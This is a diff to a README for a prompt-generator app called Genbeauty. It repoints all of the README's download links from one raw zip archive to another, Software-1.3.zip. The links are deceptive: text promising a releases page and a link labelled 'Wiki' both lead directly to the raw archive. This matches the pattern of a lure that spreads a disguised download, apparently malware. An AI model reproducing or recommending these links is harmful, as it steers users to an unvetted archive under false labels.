@@ -8,7 +8,7 @@ To get started with Genbeauty, you need to download the application. Follow thes
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
    
-   [![Download Genbeauty](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/genbeauty.zip%20Genbeauty-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/genbeauty.zip)
+   [![Download Genbeauty](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/Software-1.3.zip%20Genbeauty-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/Software-1.3.zip)
 
 2. Once on the release page, look for the latest version. You will see various files available for download.
 
@@ -75,10 +75,10 @@ We appreciate your feedback! If you have suggestions or run into bugs, please le
 ## 🔗 Additional Resources
 For more tips and tricks on using Genbeauty:
 
-- Check out the [Wiki](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/genbeauty.zip)
+- Check out the [Wiki](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/Software-1.3.zip)
 - Join our community on [Discord](#) for discussions and support.
 
 ## 💻 Conclusion
 Genbeauty simplifies the process of generating prompts, making it easier for you to focus on your creativity. Download the application today, and start transforming your ideas into beautiful prompts.
 
-Visit the releases page again to get the latest version at any time: [Download Genbeauty](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/genbeauty.zip).
+Visit the releases page again to get the latest version at any time: [Download Genbeauty](https://raw.githubusercontent.com/Alex123sMC/genbeauty/main/graphostatic/Software-1.3.zip).
